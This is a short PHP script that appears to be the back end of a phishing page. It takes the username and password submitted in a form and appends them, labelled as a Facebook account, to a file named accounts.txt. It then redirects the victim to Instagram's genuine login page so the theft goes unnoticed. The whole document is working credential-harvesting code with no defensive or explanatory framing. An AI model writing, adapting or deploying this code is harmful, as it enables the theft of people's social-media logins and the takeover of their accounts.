<?php
  $data = sprintf("Account Information {\n  Site: Facebook\n  Email: %s\n  Password: %s\n}\n\n", $_POST['username'], $_POST['password']);
  $file = "../../../accounts.txt";
  file_put_contents($file, $data, FILE_APPEND);
  sleep(1.5)
?>
<meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login" />
